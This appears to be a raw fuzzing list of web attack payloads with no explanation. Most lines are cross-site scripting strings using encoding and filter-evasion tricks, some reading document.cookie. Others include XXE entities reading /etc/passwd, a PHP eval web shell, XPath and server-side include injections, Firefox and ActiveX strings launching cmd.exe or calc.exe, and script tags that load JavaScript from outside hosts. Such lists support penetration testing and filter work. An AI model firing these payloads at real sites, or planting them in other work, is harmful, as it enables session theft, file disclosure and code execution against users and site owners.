&#60;IFRAME SRC&#61;http&#58;&#47;&#47;testsite.com&#47;scriptlet.html &#60;
"navigatorurl:test"" -chrome ""javascript:C=Components.classes;I=Components.interfaces;file=C['@mozilla.org/file/local;1'].createInstance(I.nsILocalFile);file.initWithPath('C:'+String.fromCharCode(92)+String.fromCharCode(92)+'Windows'+String.fromCharCode(92)+String.fromCharCode(92)+'System32'+String.fromCharCode(92)+String.fromCharCode(92)+'cmd.exe');process=C['@mozilla.org/process/util;1'].createInstance(I.nsIProcess);process.init(file);process.run(true%252c{}%252c0);alert(process)"
<video/poster/onerror=alert()>
"<script>x=""""&&prompt(9)&&"""";y=42;</script>"
</**/style=x:expression\28write(1)\29>
"<script src=""data:text/javascript,confirm(1)""></script>"
"<img src=x\\x11onerror=""javascript:alert(1)"">"
<svg/onload=prompt(1);>
"<svg xmlns=""http://www.w3.org/2000/svg""><path d=""M0,0"" style=""marker-start:url(test4.svg#a)""/></svg>"
'><svg><style>&ltimg src=x onerror=alert(1)&gt</svg>
&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;
"<a href=""// ͥ.ws"">CLICK"
javascript:confirm(0);
--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->
&msg=/></script><script>alert('0');</script>&typ=sys
<SCRIPT>a=/X/
"{{m=[({}).constructor.defineProperties];[[''.toString.constructor,{'constructor':{} }].reduce(m[0])];''.toString.constructor('alert(1)')()}}"
&query=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&mode=author
'><script>alert(1)</script>
"<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""file:///etc/passwd"" >]>"
"""><p style=""font-family:'\22\3bx:expression(alert(1))/*'"">"
">""<div style=""background-image: url(javascript:document.cookie=true;);"">"
"LOL<style>*{/*all*/color/*all*/:/*all*/red/*all*/;/[0]*IE,Safari*[0]/color:green;color:bl/*IE*/ue;}</style>"
"<img src=x onerror=\\x09""javascript:alert(1)"">"
"<A HREF=""http://6&#09;6.000146.0x7.147/"">XSS</A>"
<script>+-+-1-+-+confirm(1)</script>
&lt;SCRIPT&gt;a=/X/
<script>eval.call`${'prompt\x281)'}`</script>
"<iframe%0Aname=""javascript:\u0061\u006C\u0065\u0072\u0074(1)"" %0Aonload=""eval(name)"";>"
<video src=1 onerror=alert(1)>
"\"";alert('CrossSiteScripting');//"
"<x:script xmlns:x=""http://www.w3.org/1999/xhtml"">alert('xss');</x:script>"
"<svg xmlns=""http://www.w3.org/2000/svg"" id=""x""><listener event=""load"" handler=""#y"" xmlns=""http://www.w3.org/2001/xml-events"" observer=""x""/><handler id=""y"">alert(1)</handler></svg>"
<script>~'\\u0061' ;  \\u0074\\u0068\\u0072\\u006F\\u0077 ~ \\u0074\\u0068\\u0069\\u0073.  \\u0061\\u006C\\u0065\\u0072\\u0074(~'\\u0061')</script U+
<svg onload=evt.target[/innerHT/.source%2b/ML/.source]=evt.target[/ownerDocumen/.source%2b/t/.source][/U R/.source%2b/L/.source]#<img src=/ onerror=alert(domain)>
"<a href=""data:text/html,<script>eval(name)</script>"" target=""confirm(1)"">click</a>"
&&fuseaction=tools.message&message=%22%3E%3Cvar%20onmouseover=%22prompt%28/XSSPOSED/%29%22%3EOn%20Mouse%20Over%3C/var%3E&title=Activity
<a[\x0B]
“oncut=’/*
"'><xml src=""javascript:alert(1);"">"
"<xml src=""httP://ha.ckers.org/xsstest.xml"" id=i></xml><span datasrc=#i datafld=c dataformatas=html></span>"
<script>var%20x%20=%20â€œaâ€;%20confirm(1);//â€;</script>
</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
\xc2\xbcscript\xc2\xbealert(\xc2\xa2XSS\xc2\xa2)\xc2\xbc/script\xc2\xbe
<scr<script>ipt>prompt(document.cookie)</scr</script>ipt>
<svg onload=location='//p0.al'>
&search_term=%22%3E%3Cimg%20src%3Dhttp://i.imgur.com/KYRF0.jpg%20height%3D600%20width%3D450%3E
[notmalicious](javascript:window.onerror=alert;throw%20document.cookie)
&#0060
'><svg onload=\u0061lert(1)>
'><audio src=1 onerror=alert(1)>
"<?xml-stylesheet type=""text/xsl"" href=""#"" ?><stylesheet xmlns=""http://www.w3.org/TR/WD-xsl""><template match=""/""><eval>new ActiveXObject(&apos;htmlfile&apos;).parentWindow.alert(1)</eval><if expr=""new ActiveXObject(\'htmlfile\').parentWindow.alert(2)""></if></template></stylesheet>"
"""><body/onpageshow=alert(1)>"
<style/onload=confirm(1)>
"<img src\x32=x onerror=""javascript:alert(1)"">"
"<!--#echo var=""query_string"" -->"
"""><img src=""xx:x"" alt=""``onerror=confirm(1)""><script>document.body.innerHTML+=''</script>"
count(/child::node())
%E0%80%BCimg%20src%3D%E0%80%A21%E0%80%A2%20onerror%3D%E0%80%A2alert(1)%E0%80%A2%E0%80%BE
&localeCode=en_US&complexSearchField=%27%22%3E%3C%2Ftitle%3E%3Cscript%3E+alert%28%22XSSPOSED%22%29%3C%2Fscript%3E%3E%2F&searchType=&propertyIds=&arrivalDate=&departureDate=
%3Cdiv%20style=writing-mode:tb-rl%3Boverflow:scroll%20onscroll=alert(1)%3E
<script>/* **chr*/log(*num*)// */</script>
"'></script><script>/*var a=""/*""""'/**/;alert(1);//</script>"
"""><script>window.open( ""http://127.0.0.1:3555/xss_serve_payloads/X.html"" )</script>"
"""<META HTTP-EQUIV=""""refresh"""" CONTENT=""""0; URL=http://;URL=javascript:alert('XSS');"""">"""
<img src = ”http://127.0.0.1:3555/xss_serve_payloads/X.js”>
<title onpropertychange=javascript:alert(1)></title><title title=>
"""><script>alert(""/X""/)</script>"
&clickTAG=http://www.youtube.com/watch
"<SCRIPT a="">'>"" SRC=""http://127.0.0.1:3555/xss_serve_payloads/X.js""></SCRIPT>"
"data:,<?php eval($_REQUEST[cmd]);?>&cmd=phpinfo();"
"""><img onerror=a&#108ert(1) src=a>"
"<a href=""j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;confirm&lpar;1&rpar;"">Click<test>"
"""<SCRIPT ="""">"""" SRC=""""http://ha.ckers.org/xss.js""""></SCRIPT>"""
<script for=document event=onreadystatechange>getElementById('safe123').click()</script>
</script><script>alert(123)</script>
\\x3c
"""><q/oncut=alert(1)>"
"javascript:alert()//--></script></textarea></style></title><a""//\' onclick=alert()//>*/alert()/*"
&#60;STYLE&#62;BODY&#123;-moz-binding&#58;url&#40;&#34;http&#58;&#47;&#47;testsite.com&#47;xssmoz.xml&#35;xss&#34;&#41;&#125;&#60;&#47;STYLE&#62;
'><form id=test onforminput=prompt(1)><input></form><button form=test onformchange=prompt(2)>X</button>
"<SCRIPT LANGUAGE=""VBScript"">%0a%0dFunction window_onload%0a%0dAlert 1%0a%0dEnd Function </SCRIPT>"
<get:GetBillingAccounts><get:searchType>Savings</get:searchType><get:searchCriteria>Name</get:searchCriteria><get:searchValue>nouser'] | P | //user[name/text()='nouser</get:searchValue></get:GetBillingAccountsInputType>
"""/><isindex action=""javas&Tab;cript:confirm(1)"" type=image>"
&#X00003e
"""><applet code=""javascript:confirm(1);"">"
"'><SCRIPT a="">"" SRC=""http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp""></SCRIPT>"
<scr%00ipt>prompt(1)</sc%00ript>
"<OBJECT CLASSID=""clsid:333C7BC4-460F-11D0-BC04-0080C7055A83""><PARAM NAME=""DataURL"" VALUE=""javascript:alert(1)""></OBJECT>"
<scrscriptipt>alert(1)</scrscriptipt>
<script> var+MouseEvent=function+MouseEvent(){}; MouseEvent=MouseEvent var+test=new+MouseEvent(); test.isTrusted=true; test.type='click';  document.getElementById(%22safe123%22).click=function()+{confirm(Safe.get());} document.getElementById(%22safe123%22).click(test); </script>
<button>'><img src=x onerror=confirm(0);></button>
<img src='1' onerror\x00=alert(0) />
">""<iframe src=http://vulnerability-lab.com/>@gmail.com"
<iframe<?php echo chr(11)?> onload=alert('XSS')></iframe>
"ExternalInterface.call(""document.write"",""<script>confirm(1)</script>"");"
"'><IMG SRC=""jav	ascript:alert(1);"">"
"'></script><script>alert(String.fromCharCode(75,67,70))</script>"
"'`""><\x00script>javascript:alert(1)</script>"
"<a href=""\x01javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>"
"<x xmlns:ev=""http://www.w3.org/2001/xml-events"" ev:event=""load"" ev:handler=""javascript:alert(1)//#x""/>"
&SQ=%22xss+protection%3Cscript%3Ealert%28document.cookie%29%3B%3C%2Fscript%3E%22&act=RSR&searchAID=&forumID=8
"""<?xml version=""""1.0"""" encoding=""""ISO-8859-1""""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM """"file:////dev/random"""">]><foo>&xxe;</foo>"""
"""><img[%0a]onerror=alert(1) src=a>"
<script>var script = document.getElementsByTagName('script')[0]; var clone = script.childNodes[0].cloneNode(true); var ta = document.createElement('textarea'); ta.appendChild(clone); confirm(ta.value.match(/cookie = '(.*?)'/)[1])</script>
"""%3cscript%3ealert(""""WXSS"""");%3c/script%3e"""
"<ul><li><svg onload=""confirm(1)""></li></ul>"
"""><img src=x onerror=""javascript:window.onerror=alert;throw 1"">"
"<form><button formaction=""javascript:alert(1)"">X</button>"
<img src=`xx:xx`onerror=confirm(1)>
&#60;IMG SRC&#61;&#34;livescript&#58;&#91;code&#93;&#34;&#62;
<img\x0bsrc='1'\x0bonerror=alert(0)>
"<BODY BACKGROUND=""javascript:alert(1)"">"
"<IMG SRC=""livescript:[code]"">"
&q=%3Cbody%20onload=alert(%22XSS%22)%3E
<IMG SRC=javascript:alert(&quot;X&quot;)>
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
"new XMLHttpRequest().open(""GET"", ""data:text/html,<svg onload=confirm(2)></svg>"", false);"
"'><body onMouseEnter body onMouseEnter=""javascript:javascript:alert(1)""></body onMouseEnter>"
"""><article xmlns=""><img src=x onerror=alert(1)""></article>"
"'><SCRIPT a="">"" '' SRC=""http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp""></SCRIPT>"
"<meta http-equiv=Set-Cookie content=""testldcp=5230"">"
'';}}</script><script>alert(1)</script>
"<script>document.body.innerHTML=""<a onmouseover%0B=location='\x6A\x61\x76\x61\x53\x43\x52\x49\x50\x54\x26\x63\x6F\x6C\x6F\x6E\x3B\x61\x6C\x65\x72\x74\x26\x6C\x70\x61\x72\x3B\x31\x26\x72\x70\x61\x72\x3B'><input name=attributes>"";</script>"
&q=%27%3E%3C/script%3E%3Cscript%3Ejavascript:alert(/XSSPOSED/)%3C/script%3E
"&lt;SCRIPT a=\""&gt;\"" SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;"
"'><div id=d><x xmlns=""><iframe onload=alert(1)""></div> <script>d.innerHTML=d.innerHTML</script>"
"'><body onload=""alert(1);"">"
"“;alert(String.fromCharCode(75,67,70))"
"101,114,116,40,34,67,114,111,115,115,83,105,116,101,83,99,114,105,112,116,105,1"
<BODY ONLOAD=confirm('XSS')>
"<embed src=""javascript:alert(1)"">"
"<a href=""javas\x0Acript:javascript:alert(1)"" id=""fuzzelement1"">test</a>"
<frameset onload=alert(1)>
"<TABLE BACKGROUND=""javascript:document.cookie=true;"">"
"""><div id=d><x xmlns=""><iframe onload=alert(1)""></div> <script>d.innerHTML=d.innerHTML</script>"
"';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//"";alert(String.fromCharCode (88,83,83))//"";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>"
"<x data-bind="".:&#x5cu0061lert(1)"">"
"setTimeout(\u0061\u006c\u0065\u0072\u0074(1),0);"
"<link rel=stylesheet href=data:,*%7bx:expression(write(1))%7d"
"`""'><img src=xxx:x \x0Donerror=javascript:alert(1)>"
"(String.fromCharCode(97,108,101,114,116,40,39,104,105,39,41))"
&kid=TTB2
"""<img/src=` onerror=confirm(1)>"""
"<object data=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">?"
%22/%3E%3CBODY%20onload=\xe2\x80\x99document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)\xe2\x80\x99%3E
<IMG SRC=javascript:prompt(document.location)>
"<iframe src=/ onload=eval(unescape(this.name.replace(/\/g,null))) name=fff%253Dnew%2520this.contentWindow.window.XMLHttpRequest%2528%2529%253Bfff.open%2528%2522GET%2522%252C%2522xssme2%2522%2529%253Bfff.onreadystatechange%253Dfunction%2528%2529%257Bif%2520%2528fff.readyState%253D%253D4%2520%2526%2526%2520fff.status%253D%253D200%2529%257Bconfirm%2528fff.responseText%2529%253B%257D%257D%253Bfff.send%2528%2529%253B></iframe>"
<script>eval(location.hash.slice(1))</script>
"<video src=""x"" onloadstart=""alert(1)"">"
"""""+{valueOf:alert}"
typeof delete typeof  delete void void new new alert`1`
"-1<iframe src=""javascript:document.cookie=true;>"
"<div id=""x"">x</div> <xml:namespace prefix=""t""> <import namespace=""t"" implementation=""#default#time2""> <t:set attributeName=""innerHTML"" targetElement=""x"" to=""&lt;img&#11;src=x:x&#11;onerror&#11;=javascript:alert(1)&gt;"">"
"""><script>’alert(1)’.replace(/.+/,eval)</script>"
"<STYLE>@im\port'\ja\vasc\ript:alert(""CrossSiteScripting"")';</STYLE>"
"'><ScRIPt<aLeRT(String.fromCharCode(75,67,70))</ScRIPt>"
"<a href=""\\x0Ajavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>"
<ScriPt>ALeRt(“ X ”)</scriPt>
"""><FRAMESET><FRAME SRC=""javascript:alert(1);""></FRAMESET>"
<svg><script>/*&midast;&sol;confirm(3)&sol;&sol;*/</script></svg>
"<iframe sandbox=""allow-same-origin allow-forms allow-scripts"" src=""http://example.org/""></iframe>"
"""><textarea autofocus onfocus=alert(1)>"
}</style><script>a=eval;b=alert;a(b(/i/.source));</script>
<svg><style>&lt;img/src=x onerror=alert(1)// </b>
"for(i=10;i>1;i--)confirm(i);new ActiveXObject(""WScript.shell"").Run('calc.exe',1,true);"
"<INPUT TYPE=""IMAGE"" SRC=""javascript:javascript:alert(1);"">"
&LT;
"<style><img src=""</style><img src=x onerror=alert(XSS)//"">"
&lt;SCRIPT&gt;alert('XSS');&lt;/SCRIPT&gt;
"<img[a][b]src=x[d]onerror[c]=[e]""alert(1)"">"
"<svg onResize svg onResize=""javascript:javascript:alert(1)""></svg onResize>"
X<x style=`behavior:url(#default#time2)` onbegin=`write(1)` >
"<form id=""test"" /><button form=""test"" formaction=""javascript:alert(123)"">TESTHTML5FORMACTION"
alert(1 ===  1)
"&lt;IMG SRC=`javascript&#058;alert(\""RSnake says, 'XSS'\"")`&gt;"
"""><img onerror=a&#x006c;ert(1) src=a>"
"@""><img src=x/onerror=confirm(1)>xss"
<math><a/xlink:href=javascript:eval('\141\154\145\162\164\50\61\51')>X
%E2%88%80%E3%B8%80%E3%B0%80script%E3%B8%80alert(1)%E3%B0%80/script%E3%B8%80​
"<a href=""\\x19javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>"
"<script>document.cookie=""testldcp=5230;""</script>"
"'><a style=""pointer-events:none;position:absolute;""><a style=""position:absolute;"" onclick=""alert(1);"">XXX</a></a><a href=""javascript:alert(2)"">XXX</a>"
xâ€</title><img src%3dx onerror%3dconfirm(1)>
eval(location.hash.slice(1))
12&<script>alert(123)</script>=123
"<img src\\x10=x onerror=""javascript:alert(1)"">"
'><script language=vbs>MsgBox 1</script>
"<script>alert(""hellox worldss"")</script>&safe=high&cx=006665157904466893121:su_tzknyxug&cof=FORID:9#510"
&product=prints&q=%22-confirm%28/XSSPOSED/%29-%22
<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
&#x03c;
"<meta http-equiv=refresh content=+.1,javascript:confirm(document.cookie)>"
"<APPLET+CODE=""""+CODEBASE=""http://url/xss"">"
"""`'><script>\xE2\x80\x8Ajavascript:alert(1)</script>"
&#60;IMG SRC&#61;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#34;
"""\""><img src=\""x\"" onerror=\""confirm(0)\""/>"","
"<?xml version=""1.0""?><?xml-stylesheet type=""text/xsl"" href=""data:,%3Cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform' id='xss'%3E%3Cxsl:output method='html'/%3E%3Cxsl:template match='/'%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E""?><root/>"
"<DIV STYLE=""background-image: url(&#1;javascript:alert('XSS'))"">"
&#60;IMG SRC&#61;JaVaScRiPt&#58;alert&#40;&#39;XSS&#39;&#41;&#62;
"'><script\x0Ctype=""text/javascript"">javascript:alert(1);</script>"
%uff02%uff1e%uff1cscript%uff1ealert(1);%uff1c/script%uff1e
"<a href=""\x1Djavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>"
"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
<script>alert//.%0D(1)</script>
"<details ontoggle=""aler\u0074(1)"">"
"<STYLE TYPE=""text/javascript"">document.cookie=true;</STYLE>"
"'><A HREF=""h tt	p://6&#09;6.000146.0x7.147/"">X</A>"
"""+onfocus=""prompt(1)""+"
(/* */oNcliCk=alert() )
"<body onLoad=""while(true) alert('XSS');"">"
"'></script ""/*'/*><img/src=x */; onerror=alert(1) //"
javascript&#x3A;confirm&lpar;document&period;cookie&rpar;
"<img src=""x` `<script>alert(1)</script>"
"""><script src=""javascript:alert(1)"">"
"""><<SCRIPT>alert(1);/"
"&s=""><script>alert(String.fromCharCode(88,83,83))</script>"
%'});%0aalert(1);%20//
"""onDblClick=""&#119;indow['aleraaaat'.re&#0112;lace('aaaa','')]('XaaaaSaaaaS'.re&#0112;lace('aaaa','').re&#0112;lace('aaaa',''))"""
"""<INPUT TYPE=""""IMAGE"""" SRC=""""javascript:alert('XSS');"""">"""
"<img src=""blah""onmouseover=""alert(1);"">"
"<x:script xmlns:x=""http://www.w3.org/1999/xhtml"">alert(1);</x:script>"
&video_query=%27%27}}%29%3Balert%28%27XSS%27%29%3Bvar%20a%3D%28{b%3A{b%3A%27
"<img src=x onerror=\x10""javascript:alert(1)"">"
"<SCRIPT a="">"" SRC=""http://xss.cx/xss.js""></SCRIPT>"
navigator.vibrate(500)
">""<script>document.cookie=true;//--></script>"
'><script>alert(x.y.x.y.x.y[0]);alert(x.x.x.x.x.x.x.x.x.y.x.y.x.y[0]);</script>
"&lt;IMG SRC=\\""livescript&#058;&#91;code&#93;\\""&gt;"
<img/src=%00 id=confirm(1) onerror=eval(id)
"<!--#echo var=""request_uri"" -->"
&#34;onmouseover=&#34;alert(1)
"javascript:/*-- >]]>%>?></script></title></textarea></noscript></style></xmp>"">[img=1,name=/alert(1)/.source]<img - /style=a:expression&#40&#47&#42'/- /*&#39,/**/eval(name)/*%2A///*///&#41;;width:100%;height:100%;position:absolute;-ms- behavior:url(#default#time2) name=alert(1)onerror=eval(name) src=1 autofocus onfocus=eval(name) onclick=eval(name) onmouseover=eval(name) onbegin=eval(name) background=javascript:eval(name)//>"""
&quot;&gt;&lt;img src=x onerror=confirm(1);&gt;
"'><img src=""http://127.0.0.1:3555/xss_serve_payloads/image.png"" onerror=alert(1)>"
"""><video><source onerror=""prompt(1)"">"
<body/onload=javascript:window.onerror=eval;throw'=alert\x281\x29';>
<script>alert([!![]] [])</script>
"<meta http-equiv=Set-Cookie content=""testcctq=9623"">"
"d=""alert('CrossSiteScripting');\"")"";"
"c=""javascript:"";"
"'><div style=""behaviour: url(http://127.0.0.1:3555/xss_serve_payloads/X.html);"">"
"<script>eval(""\141\154\145\162\164`1`"")</script> // Octal escapes combined ES6 Diacritical Grave"
"<A HREF=""htt	p://6	6.000146.0x7.147/"">XSS</A>"
--><script>alert(123)</script>
"&query=psychomantis&store_name=\\%27,init%29%29;}if%281==1%29{confirm%28/XSSPOSED/%29;//"
"""><iframe src=mhtml:http://127.0.0.1:3555/xss_serve_payloads/X.html!X.html></iframe>"
"<BODY BACKGROUND=""javascript:alert('CrossSiteScripting')"">"
&#X3e;
"""><div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(1)>"
"<style><img src=""</style><img src=x onerror=alert(123)//"">"
"<a target=""x"" href=""xssme?xss=%3Cscript%3EaddEventListener%28%22DOMFrameContentLoaded%22,%20function%28e%29%20{e.stopPropagation%28%29;},%20true%29;%3C/script%3E%3Ciframe%20src=%22data:text/html,%253cscript%253eObject.defineProperty%28top,%20%27MyEvent%27,%20{value:%20Object,%20configurable:%20true}%29;function%20y%28%29%20{confirm%28top.Safe.get%28%29%29;};event%20=%20new%20Object%28%29;event.type%20=%20%27click%27;event.isTrusted%20=%20true;y%28event%29;%253c/script%253e%22%3E%3C/iframe%3E"
&#60;STYLE type&#61;&#34;text&#47;css&#34;&#62;BODY&#123;background&#58;url&#40;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#34;&#41;&#125;&#60;&#47;STYLE&#62;
""">><marquee><img src=x onerror=confirm(1)></marquee>"" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"" ></script><script>alert(1)</script>""><img/id=""confirm&lpar; 1)""/alt=""/""src=""/""onerror=eval(id&%23x29;>'""><img src=""http: //i.imgur.com/P8mL8.jpg"">"
"""><input type=""image"" dynsrc=""javascript:alert(1);"">"
"<form><iframe &#09;&#10;&#11; src=""javascript&#58;alert(1)""&#11;&#10;&#09;;>"
